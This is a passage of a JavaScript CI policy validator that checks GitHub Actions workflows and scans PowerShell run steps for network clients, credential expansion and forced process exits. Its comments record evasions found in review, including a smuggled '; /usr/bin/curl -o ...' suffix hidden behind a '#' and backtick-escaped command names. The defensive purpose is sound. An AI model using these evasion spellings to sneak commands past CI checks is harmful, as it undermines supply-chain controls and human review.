const REVIEWED_GENERATOR_HELP = Object.freeze({
  'Get-ScriptVersionRecord': Object.freeze(['ScriptText', 'ExpectedVersion']),
  'Test-ScriptVersionParser': Object.freeze([]),
  'ConvertTo-LowerHex': Object.freeze(['Bytes']),
  'Get-Sha256Hex': Object.freeze(['Bytes']),
  'Get-FileSha256Hex': Object.freeze(['LiteralPath']),
  'Test-PathTextIsSafe': Object.freeze(['RawPath']),
  'Assert-OrdinaryPathComponent': Object.freeze(['LiteralPath', 'ExpectedType']),
  'Get-OrdinaryDestinationState': Object.freeze(['LiteralPath']),
  'Test-FileSystemEntry': Object.freeze(['LiteralPath']),
  'Assert-OrdinaryAbsolutePath': Object.freeze(['LiteralPath', 'ExpectedLeafType']),
  'Test-PathContainedByRoot': Object.freeze(['Root', 'Candidate']),
  'Initialize-WindowsFileIdentityType': Object.freeze([]),
  'Get-OrdinaryFileIdentity': Object.freeze(['LiteralPath']),
  'Assert-TrackedFile': Object.freeze(['RepositoryRoot', 'RepositoryPath']),
  'ConvertFrom-StrictUtf8': Object.freeze(['Bytes']),
  'ConvertTo-NormalizedUtf8': Object.freeze(['CompleteFinalPayload']),
  'New-CopilotPayload': Object.freeze(['GuideContent']),
  'New-TerraformInstructionsPayload': Object.freeze(['GuideContent']),
  'New-ChatPayload': Object.freeze(['GuideContent']),
  'New-FullPayload': Object.freeze(['GuideContent', 'RationaleContent']),
  'New-StyleGuidePayloadMap': Object.freeze(['GuideBytes', 'RationaleBytes']),
  'New-ArtifactRecord': Object.freeze(['ArtifactId', 'RepositoryPath']),
  'Initialize-AtomicFileReplacementType': Object.freeze([]),
  'Write-StyleGuideArtifact': Object.freeze([
    'ArtifactId', 'RawDestinationPath', 'CompletePayloadBytes', 'RepositoryRoot', 'DestinationMap',
  ]),
  'Write-GeneratorResult': Object.freeze(['Result']),
});
const REVIEWED_VERIFY_HELP = Object.freeze({
  'Invoke-GitRaw': Object.freeze(['GitArguments']),
  'ConvertFrom-NulPathRecordStream': Object.freeze(['PathRecordBytes']),
  'Assert-AllowedPathSet': Object.freeze(['PathRecords', 'AllowedPaths', 'SurfaceName']),
  'Get-GitControlSurfaceDigest': Object.freeze([]),
  'Get-WorktreeFileDigestMap': Object.freeze([]),
});
const REVIEWED_GENERATOR_SHOULD_PROCESS = Object.freeze([
  'New-StyleGuideCopilotVersion',
  'New-StyleGuideTerraformInstructionsVersion',
  'New-StyleGuideChatVersion',
  'New-StyleGuideFullVersion',
]);
const MAXIMUM_YAML_BYTES = 1024 * 1024;
const MAXIMUM_NODE_COUNT = 10000;
const MAXIMUM_DEPTH = 64;

class PolicyError extends Error {
  constructor(category, message) {
    super(`${category}: ${message}`);
    this.name = 'PolicyError';
    this.category = category;
  }
}

function reject(category, message) {
  throw new PolicyError(category, message);
}

function selectCliMode(argv) {
  if (argv.length === 1 && argv[0] === PREFLIGHT_ARGUMENT) return 'preflight';
  if (argv.includes(PREFLIGHT_ARGUMENT)) {
    reject('cli', '--preflight must be the only argument');
  }
  if (argv.length !== 2) reject('cli', 'expected --preflight or exactly two workflow arguments');
  return 'repository';
}

// The full source digest closes exact reviewed bytes. This smaller authoring
// contract keeps an intentional digest re-baseline from silently dropping the
// cycle-1 repair: the helper set, single-line help shape, parameter coverage,
// examples, private banner, version, and positional truth remain independently
// named. PowerShell AST validation still runs in the implementation checks; this
// lexical guard keeps the offline Node policy self-contained.
function powerShellTopLevelFunctions(source) {
  const matches = [...source.matchAll(/^[ \t]*function[ \t]+([A-Za-z][A-Za-z0-9-]*)[ \t]*\{/gmu)];
  return matches.map((match, index) => Object.freeze({
    name: match[1],
    body: source.slice(match.index + match[0].length, matches[index + 1]?.index ?? source.length),
  }));
}

function assertPowerShellPrivateHelperHelp(source, reviewed, version, category, label) {
  const functions = powerShellTopLevelFunctions(source);
  const observedNames = functions.map((entry) => entry.name);
  const reviewedNames = Object.keys(reviewed);
  if (JSON.stringify(observedNames) !== JSON.stringify(reviewedNames)) {
    reject(category, `${label} helper names differ from the reviewed authoring contract`);
  }

  for (const entry of functions) {
    const helpMatch = entry.body.match(/^\n((?:(?:[ \t]*#[^\n]*|[ \t]*)\n)+)/u);
    if (helpMatch === null) {
      reject(category, `${label} helper ${entry.name} does not contain complete single-line comment-based help`);
    }
    const sections = [];
    let current = null;
    for (const line of helpMatch[1].split('\n')) {
      const keyword = line.match(/^[ \t]*# \.([A-Z]+)(?:[ \t]+([A-Za-z][A-Za-z0-9]*))?[ \t]*$/u);
      if (keyword !== null) {
        current = { keyword: keyword[1], name: keyword[2] ?? null, content: [] };
        sections.push(current);
        continue;
      }
      if (current !== null) {
        const content = line.match(/^[ \t]*#(?:[ \t](.*))?$/u);
        if (content !== null && (content[1] ?? '').trim() !== '') {
          current.content.push(content[1].trim());
        }
      }
    }

    const parameters = reviewed[entry.name];
    const reviewedKeywords = [
      'SYNOPSIS', 'DESCRIPTION',
      ...parameters.map(() => 'PARAMETER'),
      'EXAMPLE', 'EXAMPLE', 'INPUTS', 'OUTPUTS', 'NOTES',
    ];
    if (JSON.stringify(sections.map((section) => section.keyword)) !== JSON.stringify(reviewedKeywords) ||
        sections.some((section) => section.content.length === 0)) {
      reject(category, `${label} helper ${entry.name} does not contain complete single-line comment-based help`);
    }
    const observedParameters = sections
      .filter((section) => section.keyword === 'PARAMETER')
      .map((section) => section.name);
    if (JSON.stringify(observedParameters) !== JSON.stringify(parameters)) {
      reject(category, `${label} helper ${entry.name} parameter help differs from the reviewed contract`);
    }

    const notes = sections.find((section) => section.keyword === 'NOTES').content;
    const notesText = notes.join(' ');
    if (notes[0] !== 'PRIVATE/INTERNAL HELPER - This function is not part of the public API' ||
        !notesText.includes('Parameters, return shape, and positional contract may change without notice.') ||
        !notesText.includes(`Version: ${version}`)) {
      reject(category, `${label} helper ${entry.name} private notes differ from the reviewed contract`);
    }
    if (parameters.length === 0) {
      if (!notesText.includes('This function declares no parameters.')) {
        reject(category, `${label} helper ${entry.name} positional notes differ from the reviewed contract`);
      }
    } else {
      for (let index = 0; index < parameters.length; index += 1) {
        if (!notesText.includes(`Position ${index}: ${parameters[index]}`)) {
          reject(category, `${label} helper ${entry.name} positional notes differ from the reviewed contract`);
        }
      }
    }

    const afterHelp = entry.body.slice(helpMatch[0].length);
    const singleLineAttribute = '[ \\t]*\\[[^\\n]+\\]\\n';
    const suppressionAttribute = (
      '[ \\t]*\\[System\\.Diagnostics\\.CodeAnalysis\\.SuppressMessageAttribute\\(\\n' +
      '(?:[^\\n]*\\n)*?[ \\t]*\\)\\]\\n'
    );
    const parameterBlock = new RegExp(
      `^(?:(?:${singleLineAttribute})|(?:${suppressionAttribute}))*[ \\t]*param[ \\t]*\\(`,
      'u',
    );
    if (!parameterBlock.test(afterHelp)) {
      reject(category, `${label} helper ${entry.name} help is not immediately above its parameter block`);
    }
  }
}

function assertGeneratorShouldProcess(source) {
  const functions = new Map(powerShellTopLevelFunctions(source).map((entry) => [entry.name, entry.body]));
  const attribute = "[CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'Low')]";
  const decision = "if (-not $PSCmdlet.ShouldProcess($DestinationPath, 'Publish generated style-guide artifact')) {";
  for (const name of REVIEWED_GENERATOR_SHOULD_PROCESS) {
    const body = functions.get(name) ?? '';
    const attributeIndex = body.indexOf(attribute);
    const decisionIndex = body.indexOf(decision);
    const writeIndex = body.indexOf('Write-StyleGuideArtifact');
    if (attributeIndex < 0 || decisionIndex < 0 || writeIndex < 0 || decisionIndex > writeIndex ||
        body.split(decision).length - 1 !== 1) {
      reject('supply-policy', `the generator helper ${name} does not support ShouldProcess at its write boundary`);
    }
  }
  if (/SuppressMessageAttribute[^\n]*PSUseShouldProcessForStateChangingFunctions/iu.test(source)) {
    reject('supply-policy', 'the generator suppresses an applicable ShouldProcess rule');
  }
}

// Folded the same way policyDigest folds its inputs, and for the same reason:
// concatenating file bytes is ambiguous, so each contribution is framed by its
// path and exact byte length. Sorted by name so the walk order of the
// filesystem cannot change the result.
//
// The readers are parameters for the same reason assertNoNpmConfiguration's
// are: a gate asserted only against the live checkout can be observed passing
// and never observed firing, which is no evidence that it works.
export function foldParserTree(root, readDirectory = readdirSync, readFile = readFileSync) {
  const hash = createHash('sha256');
  const walk = (directory, prefix) => {
    const entries = [...readDirectory(directory, { withFileTypes: true })]
      .sort((left, right) => (left.name < right.name ? -1 : 1));
    for (const entry of entries) {
      const path = join(directory, entry.name);
      const relative = prefix === '' ? entry.name : `${prefix}/${entry.name}`;
      if (entry.isDirectory()) {
        walk(path, relative);
        continue;
      }
      // A symbolic link in the parser tree is content this digest would read
      // through rather than describe, so the shape is refused outright.
      if (!entry.isFile()) {
        reject('supply-policy', `the YAML parser tree contains a non-ordinary entry: ${relative}`);
      }
      const bytes = readFile(path);
      hash.update(`${relative}:${bytes.length}\n`, 'utf8');
      hash.update(bytes);
    }
  };
  walk(root, '');
  return hash.digest('hex');
}

export function assertReviewedParserTree(root, readDirectory = readdirSync, readFile = readFileSync) {
  if (foldParserTree(root, readDirectory, readFile) !== REVIEWED_PARSER_TREE_SHA256) {
    reject('supply-policy', 'the installed YAML parser does not match its reviewed bytes');
  }
}

let loadedParser = null;

// Loaded on first use rather than at module evaluation, so a mismatch reports
// as an ordinary policy rejection through the caller's error path instead of
// as an exception thrown during import.
function reviewedParser() {
  if (loadedParser !== null) return loadedParser;
  const parserRoot = join(dirname(fileURLToPath(import.meta.url)), 'node_modules', 'yaml');
  assertReviewedParserTree(parserRoot);
  // Resolution does not evaluate anything, so this is safe to ask before the
  // load and worth asking: hashing one directory and then loading whatever the
  // resolver happens to return would leave the digest describing a tree the
  // process never used.
  const load = createRequire(import.meta.url);
  const entry = realpathSync(load.resolve('yaml'));
  if (!entry.startsWith(realpathSync(parserRoot) + sep)) {
    reject('supply-policy', 'the YAML parser resolves outside the reviewed package directory');
  }
  loadedParser = load('yaml');
  return loadedParser;
}

function stable(value) {
  if (Array.isArray(value)) return value.map(stable);
  if (value !== null && typeof value === 'object') {
    return Object.fromEntries(Object.keys(value).sort().map((key) => [key, stable(value[key])]));
  }
  return value;
}

function equal(actual, expected) {
  return JSON.stringify(stable(actual)) === JSON.stringify(stable(expected));
}

function assertEqual(actual, expected, label) {
  if (!equal(actual, expected)) reject('policy', `${label} differs from the locked policy`);
}

function assertKeys(value, expected, label) {
  if (value === null || typeof value !== 'object' || Array.isArray(value)) {
    reject('schema', `${label} must be a mapping`);
  }
  const actual = Object.keys(value).sort();
  const wanted = [...expected].sort();
  if (!equal(actual, wanted)) reject('schema', `${label} has missing or extra keys`);
}

function inspectYamlNode(node, depth, state) {
  if (node === null || node === undefined) return;
  const parser = reviewedParser();
  state.count += 1;
  if (state.count > MAXIMUM_NODE_COUNT) reject('yaml-limit', 'node count exceeds the bound');
  if (depth > MAXIMUM_DEPTH) reject('yaml-limit', 'nesting depth exceeds the bound');
  if (node.anchor) reject('yaml-syntax', 'anchors are prohibited');
  if (node.tag) reject('yaml-syntax', 'explicit or custom tags are prohibited');
  if (parser.isAlias(node)) reject('yaml-syntax', 'aliases are prohibited');

  if (parser.isMap(node)) {
    for (const pair of node.items) {
      // Keys carry anchors, tags, and aliases exactly as values do, so they are
      // inspected through the same path before the key-shape assertions below.
      inspectYamlNode(pair.key, depth + 1, state);
      if (!parser.isScalar(pair.key) || typeof pair.key.value !== 'string') {
        reject('yaml-syntax', 'mapping keys must be unique strings');
      }
      if (pair.key.value === '<<') reject('yaml-syntax', 'merge keys are prohibited');
      inspectYamlNode(pair.value, depth + 1, state);
    }
    return;
  }
  if (parser.isSeq(node)) {
    for (const item of node.items) inspectYamlNode(item, depth + 1, state);
    return;
  }
  if (parser.isScalar(node)) {
    const value = node.value;
    if (value !== null && !['string', 'number', 'boolean'].includes(typeof value)) {
      reject('yaml-syntax', 'only JSON-like scalar values are permitted');
    }
    if (typeof value === 'number' && !Number.isFinite(value)) {
      reject('yaml-syntax', 'non-finite numbers are prohibited');
    }
    return;
  }
  reject('yaml-syntax', 'unknown YAML node type');
}

export function parseStrictYaml(source, sourceName = '<fixture>') {
  // Ahead of every other check in this function, because the parser's bytes are
  // the first thing this validator depends on and the only one it cannot verify
  // after the fact.
  const parser = reviewedParser();
  if (typeof source !== 'string') reject('yaml-input', `${sourceName} is not text`);
  if (Buffer.byteLength(source, 'utf8') > MAXIMUM_YAML_BYTES) reject('yaml-limit', `${sourceName} is too large`);
  if (/^\s*%/mu.test(source)) reject('yaml-syntax', `${sourceName} contains a directive`);

  let documents;
  try {
    documents = parser.parseAllDocuments(source, {
      intAsBigInt: false,
      keepSourceTokens: true,
      logLevel: 'silent',
      prettyErrors: false,
      schema: 'core',
      strict: true,
      uniqueKeys: true,
      version: '1.2',
    });
  } catch {
    reject('yaml-syntax', `${sourceName} could not be parsed`);
  }
  if (documents.length !== 1) reject('yaml-syntax', `${sourceName} must contain exactly one document`);
  const [document] = documents;
  if (document.errors.length !== 0 || document.warnings.length !== 0) {
    reject('yaml-syntax', `${sourceName} contains a parser error or warning`);
  }
  inspectYamlNode(document.contents, 0, { count: 0 });
  const value = document.toJS({ maxAliasCount: 0, mapAsMap: false });
  JSON.stringify(value);
  return value;
}

function actionAnnotations(source) {
  const annotations = [];
  for (const line of source.split(/\r?\n/u)) {
    if (!/^\s*uses:/u.test(line)) continue;
    const match = line.match(/^\s*uses:\s*([^\s#]+)\s+#\s+(v[0-9]+\.[0-9]+\.[0-9]+)\s*$/u);
    if (!match) reject('action-policy', 'every uses line needs one exact full pin and release annotation');
    annotations.push({ reference: match[1], release: match[2] });
  }
  return annotations;
}

function findStep(job, id, label) {
  if (!Array.isArray(job.steps)) reject('schema', `${label}.steps must be a sequence`);
  const matches = job.steps.filter((step) => step && step.id === id);
  if (matches.length !== 1) reject('role-policy', `${label} must contain role ${id} exactly once`);
  return matches[0];
}

function assertActionStep(step, role, action, inputs, condition = undefined) {
  const expectedKeys = condition === undefined
    ? ['name', 'id', 'uses', 'with']
    : ['name', 'id', 'if', 'uses', 'with'];
  assertKeys(step, expectedKeys, role);
  if (step.uses !== action.reference) reject('action-policy', `${role} uses the wrong action repository or SHA`);
  if (condition !== undefined && step.if !== condition) reject('condition-policy', `${role} has the wrong condition`);
  assertEqual(step.with, inputs, `${role}.with`);
}

// Script steps are key-asserted for the same reason action steps are: an
// unasserted mapping accepts additions such as env, which the role policy never
// reviewed.
function assertScriptStep(step, label, fragment, failure) {
  assertKeys(step, ['name', 'id', 'shell', 'run'], label);
  if (step.shell !== 'pwsh') reject('policy', `${label} execution contract changed`);
  if (!step.run.includes(fragment)) reject('git-policy', failure);
}

function validateActionMultiset(source, expected) {
  const actual = actionAnnotations(source).sort((a, b) => `${a.reference}|${a.release}`.localeCompare(`${b.reference}|${b.release}`));
  const wanted = [...expected].sort((a, b) => `${a.reference}|${a.release}`.localeCompare(`${b.reference}|${b.release}`));
  assertEqual(actual, wanted, 'external action multiset');
}

function allRunSteps(workflow) {
  const runs = [];
  for (const [jobId, job] of Object.entries(workflow.jobs)) {
    for (const step of job.steps ?? []) {
      if (typeof step.run === 'string') runs.push({ jobId, id: step.id, run: step.run, step });
    }
  }
  return runs;
}

// Answers one question about one offset: is this position executable code at
// the outermost level of the script? It returns the brace nesting depth there,
// or null when the offset falls inside a comment or a quoted span.
//
// This is deliberately not a PowerShell parser. It exists because every other
// assertion in this file matches text, and a text match cannot tell a statement
// from a mention of one: $null = { ... }, if ($false) { ... }, and a multi-line
// single-quoted string all carry an approved command that never runs, and each
// round of review has produced another member of that list. Rather than name
// them, the property they all violate is measured directly.
//
// Comments and quoted spans are skipped so a brace inside a message cannot move
// the depth. Here-strings and block comments are refused before this runs, so
// the remaining span kinds are '...' and "...", both terminated on their own
// quote, with the doubling escape ('' and "") and the double-quoted backtick
// escape handled.
// Drops whole-line comments only. Trimming from the first # on every line
// would truncate a code line containing one inside a string, which would hide
// text these counts exist to see; a line that is entirely a comment cannot.
// A deliberately conservative code view: whole comment lines are removed and
// nothing else is. It does *not* truncate a line at a trailing #, because a #
// inside a quoted span is string content, and truncating there would silently
// delete real code -- turning "$null = '#'; Get-Command" into "$null = " and
// hiding the very construct a caller is scanning for. Every rule built on this
// helper is a ban, so a false negative is the dangerous direction and a line
// filter cannot produce one from code: a line whose first non-whitespace
// character is # is a comment to PowerShell too.
//
// Known and accepted imprecision: a here-string content line beginning with #
// is removed as though it were a comment. That cannot hide an executed
// construct, because such a line is a comment when the here-string is executed
// as well.
// One state machine, one idea of what "code" means.
//
// This file previously carried two. powerShellBraceDepthAt tracked comments,
// quoted spans and backtick escapes properly; powerShellCodeOnly dropped whole
// comment lines and nothing else. Two ideas of the same thing is how a gap
// survives review: the line filter was found one construct short in three
// consecutive rounds, and each fix taught it about one more spelling rather
// than about strings. Patching it a fourth time would repeat the mistake this
// pull request has made more than any other -- fixing the instance instead of
// the class -- so it is deleted and every consumer reads this projection.
//
// The projection preserves length exactly, so every offset, line number and
// brace position in the original text remains valid in it. Comment characters
// and string *contents* become spaces; the quote delimiters survive, so a
// scanner can still see that a string was there and how long it was. A
// backtick and the character it escapes both become spaces, which is what
// stops `{ from counting as a brace.
//
// A ban expressed over this projection cannot be satisfied by text in a
// comment, and cannot be evaded by hiding a construct in a string -- because a
// construct sitting in a string is inert until something executes it, and the
// only ways to execute a string are constrained separately.
//
// The one thing callers must remember: a rule that needs to read string
// *content* -- a required throw message, a reviewed digest literal -- must read
// the raw text, not this. Those are presence assertions, not bans, and the
// dangerous direction for them is the opposite one.
function powerShellCodeProjection(text, options) {
  // escapes: 'blank' neutralises a backtick and the character it escapes, which
  // is what brace depth needs -- `{ must not count. 'unescape' drops the
  // backtick and keeps the character, which is what a *name* scan needs, since
  // PowerShell removes the escape and runs cu`rl as curl. The two cannot be the
  // same view, so callers say which they mean. Length is preserved under
  // 'blank' and only under 'blank'.
  const escapes = (options && options.escapes) || 'blank';
  const characters = [];
  const emit = (from, to, blankIt) => {
    for (let i = from; i < Math.min(to, text.length); i += 1) {
      characters.push(blankIt && text[i] !== '\n' ? ' ' : text[i]);
    }
  };
  let index = 0;
  // Round 49. The index of the character most recently consumed as the target
  // of a backtick escape. The comment predicate below reads the raw character
  // before a #, and a backtick makes the following space or tab literal, so the
  // raw text alone cannot say whether that whitespace ended a token. Without
  // this, `marker` + backtick + ` #text; <command>` was read as a comment when
  // PowerShell keeps #text inside the argument and runs the command after the
  // semicolon -- measured both ways.
  let lastEscapedIndex = -1;
  while (index < text.length) {
    const character = text[index];
    // Block comments first: <# ... #> spans lines, so a scanner that only
    // blanks from # to end of line leaves the rest of the block visible as
    // code. That was reported against the first version of this projection and
    // it was right -- a block comment could supply a required phrase while the
    // executable code did something else.
    if (character === '<' && text[index + 1] === '#') {
      const close = text.indexOf('#>', index + 2);
      const stop = close === -1 ? text.length : close + 2;
      emit(index, stop, true);
      index = stop;
      continue;
    }
    if (character === '`') {
      if (escapes === 'unescape') {
        if (index + 1 < text.length) characters.push(text[index + 1]);
      } else {
        emit(index, index + 2, true);
      }
      // An escaped # never opens a comment either, and that case is already
      // closed by this branch consuming both characters before the # branch can
      // see them. What is recorded here is the *position* of the escaped
      // character, so the # branch can tell escaped whitespace from real
      // whitespace.
      lastEscapedIndex = index + 1;
      index += 2;
      continue;
    }
    if (character === '#') {
      // Round 48. PowerShell starts a comment at # only where # begins a token.
      // In argument mode `marker#text` is a single bare word, so blanking from
      // any # to the end of the line hid whatever else was on that line.
      // Measured, with the acquire step's reviewed digest re-baselined:
      //
      //   Write-Host marker#text; /usr/bin/curl -o ./Validate-WorkflowPolicy.mjs ...
      //
      // was ACCEPTED, while the byte-identical line without the # was rejected
      // as an executable script path. One character flipped the verdict, and
      // the network-client, script-path, interpreter and command-position scans
      // all read this projection, so none of them saw the request.
      //
      // Where # begins a token is mode-dependent: checked against PowerShell's
      // own parser, `$x = 1#c` is a comment in expression mode while
      // `Write-Host 12#c` is one argument in argument mode, and `,` `&` `-` `:`
      // continue a bare word while whitespace `;` `)` `}` `|` `(` and a closing
      // quote end one. Deciding that in general needs a real grammar, which is
      // a large new place to be wrong -- the same argument this file already
      // makes against parsing the acquire steps.
      //
      // So only the unambiguous cases are treated as comments: start of text,
      // or after whitespace. That covers every comment in both workflows --
      // verified, neither file contains a # preceded by anything else -- and
      // everything else stays code. This is the safe direction. Mistaking a
      // comment for code can only cause a false rejection, which is loud and
      // gets fixed; mistaking code for a comment hides an executable suffix,
      // which is silent and is exactly what was reported.
      // Round 49: whitespace that a backtick made literal did not end a token,
      // so a # after it is still inside the argument. Confirmed against
      // PowerShell's parser for an escaped space and an escaped tab, and
      // executably -- the command after the semicolon ran in both.
      const previous = index === 0 ? '' : text[index - 1];
      // index > 0 guard: at index 0 the expression index - 1 is -1, which is
      // also the initial value of lastEscapedIndex, so a # opening the text
      // would read as escaped and stay code. Caught by the differential below
      // rather than by a fixture, because no step currently begins with a
      // comment; it would have surfaced as a spurious rejection the first time
      // one did.
      const previousWasEscaped = index > 0 && index - 1 === lastEscapedIndex;
      if (!previousWasEscaped &&
          (previous === '' || previous === ' ' || previous === '\t' ||
           previous === '\n' || previous === '\r')) {
        const start = index;
        while (index < text.length && text[index] !== '\n') index += 1;
        emit(start, index, true);
        continue;
      }
      characters.push(character);
      index += 1;
      continue;
    }
    if (character === "'" || character === '"') {
      const quote = character;
      characters.push(quote);
      index += 1;
      while (index < text.length) {
        // $( ... ) inside an expandable string is evaluated, so its contents are
        // executable code and must survive into the projection. Only
        // double-quoted strings expand; a single-quoted $( is literal.
        if (quote === '"' && text[index] === '$' && text[index + 1] === '(') {
          let depth = 0;
          const start = index;
          while (index < text.length) {
            if (text[index] === '(') depth += 1;
            else if (text[index] === ')') { depth -= 1; if (depth === 0) { index += 1; break; } }
            index += 1;
          }
          // The span is code, but it is not *raw* code: it can contain its own
          // quotes, comments and escapes, and copying it verbatim leaks them
          // into the projection. Measured, "$(cu`rl ...)" kept its backtick in
          // the token view, so the curl name scan did not match while the
          // command still ran. Re-project the span under the same options --
          // recursion is length-preserving under 'blank', so brace depth is
          // unaffected.
          characters.push(powerShellCodeProjection(text.slice(start, index), options));
          continue;
        }
        if (quote === '"' && text[index] === '`') {
          if (escapes === 'unescape' && index + 1 < text.length) characters.push(text[index + 1]);
          else emit(index, index + 2, true);
          index += 2;
          continue;
        }
        if (text[index] === quote) {
          if (text[index + 1] === quote) { emit(index, index + 2, true); index += 2; continue; }
          characters.push(quote);
          index += 1;
          break;
        }
        emit(index, index + 1, true);
        index += 1;
      }
      continue;
    }
    characters.push(character);
    index += 1;
  }
  return characters.join('');
}

// Name scans read this: escapes resolved, so cu`rl reads as curl.
function powerShellTokenView(text) {
  return powerShellCodeProjection(text, { escapes: 'unescape' });
}

// For a governed step to report success while skipping a required phase, its
// pwsh process must terminate with status 0 before that phase runs. Measured on
// PowerShell 7.6.4 Core/Unix, the ways to do that are: `exit 0` and a top-level
// `return` (both refused in statement position by the callers of this helper),
// and [Environment]::Exit(0), which those statement-position rules cannot see
// because the token follows `::`. .NET documents Exit as terminating the process
// immediately with the given status -- and as skipping any finally block, which
// would also defeat the $env:CI restore in the Markdown step.
//
// SetShouldExit is refused alongside it for a different reason: measured, it
// does *not* skip the statements that follow -- it forces the process status --
// so it turns a failed phase into a green step rather than skipping one. Both
// belong to the same class of "the step reports success it did not earn".
//
// Deliberately not in this list: Stop-Process and Process.Kill. Neither can
// produce a clean zero -- killing the shell surfaces as a signal status, and
// [Environment]::FailFast was measured at 134 (SIGABRT) -- so neither buys a
// green step. Banning them by pattern would also refuse
// System.Diagnostics.Process outright, which is the mechanism build.verify uses
// to launch its credentialed Git probes. A ban that refuses a step's own
// required mechanism is a false positive, not a control; FailFast is kept only
// because it costs nothing and collides with nothing.
const PROCESS_TERMINATION = /\[\s*(?:System\.)?Environment\s*\]\s*::\s*(?:Exit|FailFast)|\bSetShouldExit\b/iu;

function powerShellBraceDepthAt(text, offset) {
  const code = powerShellCodeProjection(text);
  if (offset < 0 || offset > code.length) return null;
  // A position the projection blanked is inside a comment or a quoted span, so
  // it has no statement depth. Comparing against the original distinguishes
  // "blanked" from "was already a space".
  if (offset < code.length && code[offset] !== text[offset]) return null;
  let depth = 0;
  for (let index = 0; index < offset; index += 1) {
    if (code[index] === '{') depth += 1;
    else if (code[index] === '}') depth -= 1;
  }
  return depth;
}

// Offset of the first invocation operator on one already-projected line, or -1.
// Both operators, because both invoke and both were separately walked through:
// `&` as reported, `.` when I attacked the fix for it. Callers pass a projected
// line, so an operator inside a comment or a string is not one.
function invocationOperatorOffset(projectedLine) {
  const intCall = projectedLine.indexOf('&');
  DOT_SOURCE.lastIndex = 0;
  const objDot = DOT_SOURCE.exec(projectedLine);
  const intDot = objDot === null ? -1 : objDot.index + objDot[0].indexOf('.');
  if (intCall < 0) return intDot;
  if (intDot < 0) return intCall;
  return Math.min(intCall, intDot);
}

export function validateBuildPolicy(workflow, source) {
  assertKeys(workflow, ['name', 'on', 'permissions', 'jobs'], 'build root');
  if (workflow.name !== 'Build Style Guide Artifacts') reject('policy', 'build workflow name is not locked');
  assertEqual(workflow.on, EXPECTED_TRIGGER, 'build triggers');
  assertEqual(workflow.permissions, { contents: 'read' }, 'build workflow permissions');
  assertKeys(workflow.jobs, ['verify', 'publish'], 'build jobs');

  const verify = workflow.jobs.verify;
  assertKeys(verify, ['runs-on', 'permissions', 'steps'], 'build.verify');
  if (verify['runs-on'] !== 'ubuntu-latest') reject('policy', 'build.verify runner changed');
  // No scopes, not contents: read. This is the job that runs the generator, so
  // the repository token it would otherwise carry is given nothing to carry.
  assertEqual(verify.permissions, {}, 'build.verify permissions');
  // And no actions, which the scopes above cannot substitute for. The runner
  // populates ACTIONS_RUNTIME_TOKEN from the job's system connection rather
  // than from the permissions map -- NodeScriptActionHandler assigns it before
  // it decides whether it is running the pre, main, or post script -- so any
  // JavaScript action here would put a credential this job cannot revoke into
  // a process that outlives the generator step. The mirror of the publish
  // rule below: that job runs no script, this job uses no action.
  for (const step of verify.steps) {
    if ('uses' in step) reject('isolation-policy', `build.verify.${step.id} uses an action`);
  }
  const verifyIds = verify.steps.map((step) => step?.id);
  // generate-and-verify is last on purpose. Anything appended after it runs
  // with whatever the generator's surviving descendants left behind, including
  // values they appended to the runner's step communication files once the
  // in-step emptiness assertion could no longer observe them.
  assertEqual(verifyIds, ['acquire', 'verify-checkout-credentials', 'generate-and-verify'], 'build.verify step order');
  validateAcquireStep(findStep(verify, 'acquire', 'build.verify'), 'build.verify.acquire', BUILD_ACQUIRE);
  validateCredentialCleanupStep(
    findStep(verify, 'verify-checkout-credentials', 'build.verify'),
    'build.verify.verify-checkout-credentials',
  );

  // The publishing job exists to be the one place that reads artifact bytes
  // without ever having run the code that produces them. That property is
  // structural -- it holds because no script runs here at all -- so it is
  // asserted structurally: exactly two pinned actions, and no run: key
  // anywhere in the job. A single added script step would put repository
  // code back in the same job as the upload, which is the arrangement this
  // separation exists to prevent.
  const publish = workflow.jobs.publish;
  assertKeys(publish, ['needs', 'runs-on', 'permissions', 'steps'], 'build.publish');
  if (publish.needs !== 'verify') reject('policy', 'build.publish does not depend on verify');
  if (publish['runs-on'] !== 'ubuntu-latest') reject('policy', 'build.publish runner changed');
  assertEqual(publish.permissions, { contents: 'read' }, 'build.publish permissions');
  const publishIds = publish.steps.map((step) => step?.id);
  assertEqual(publishIds, ['checkout', 'upload-generated'], 'build.publish step order');
  for (const step of publish.steps) {
    if ('run' in step) reject('isolation-policy', `build.publish.${step.id} runs a script`);
    if ('shell' in step) reject('isolation-policy', `build.publish.${step.id} declares a shell`);
    if ('env' in step) reject('isolation-policy', `build.publish.${step.id} sets step environment`);
  }
  assertActionStep(findStep(publish, 'checkout', 'build.publish'), 'build.publish.checkout', ACTIONS.checkout, CHECKOUT_INPUTS);
  assertActionStep(
    findStep(publish, 'upload-generated', 'build.publish'),
    'build.publish.upload-generated',
    ACTIONS.uploadArtifact,
    UPLOAD_INPUTS,
  );

  for (const { jobId, id, run, step } of allRunSteps(workflow)) {
    if ('continue-on-error' in step) reject('failure-policy', `${jobId}.${id} sets continue-on-error`);
    // Code, not prose. The rationale for pinning these executables to fixed
    // paths necessarily names curl and wget, and a rule that cannot tell a
    // comment from a call would forbid the comment explaining it.
    if (NETWORK_CLIENT.test(powerShellTokenView(run))) {
      reject('network-policy', `${jobId}.${id} adds a network client`);
    }
    // Two checks, most specific first, over the whole serialized step rather
    // than over run alone -- a credential reaches the script through any step
    // key just as effectively as through script text.
    //
    // The named patterns come first so a recognised credential is reported as a
    // credential rather than as a generic expression, and because they catch
    // what the expression ban cannot: $env:GITHUB_TOKEN is a literal, not an
    // expression. All three are case-insensitive.
    //
    // The expression ban is what stops this predicate needing a fourth fix.
    // Three consecutive rounds found it one spelling short -- it scanned run
    // instead of the whole step, then matched case-sensitively, then knew only
    // the dot form and missed github['token'] -- and each fix added the
    // spelling just found. No governed script step contains an expression at
    // all, verified across all three, so the syntax itself is refused and the
    // spellings stop mattering.
    //
    // Action steps carry token: ${{ github.token }} legitimately and are never
    // scanned here: allRunSteps collects only steps with a run string.
    const serialized = JSON.stringify(step);
    if (/secrets\./iu.test(serialized) || /GITHUB_TOKEN/iu.test(serialized) || /github\.token/iu.test(serialized)) {
      reject('credential-policy', `${jobId}.${id} expands an unapproved credential`);
    }
    if (/\$\{\{/u.test(serialized)) {
      reject('credential-policy', `${jobId}.${id} contains a workflow expression`);
    }
    // Every assertion in this file matches text, so text that never executes can
    // satisfy one: a here-string or a block comment carrying an approved command
    // reads identically to the command itself. Neither governed script step uses
    // either construct, so both are refused and a match therefore means a
    // statement. Without this, anchoring the generator invocation to its own
    // line buys nothing -- here-string content sits at column zero too.
